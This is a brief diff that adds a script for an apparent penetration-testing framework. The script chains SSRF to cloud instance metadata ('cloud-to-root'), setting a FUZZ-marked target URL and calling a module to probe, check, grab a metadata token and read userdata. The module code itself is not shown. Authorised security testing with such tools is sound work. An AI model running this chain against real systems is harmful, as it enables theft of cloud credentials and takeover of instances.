@@ -1,0 +1,8 @@
+#desc: SSRF to instance metadata — the classic cloud-to-root chain
+# Needs a URL with an injection point; set SSRF_URL before running.
+set SSRF_URL=http://127.0.0.1/?url=FUZZ
+module 09 --probe
+module 09 --check "$SSRF_URL"
+module 09 --token "$SSRF_URL"
+module 09 --userdata
+stop-on-fail
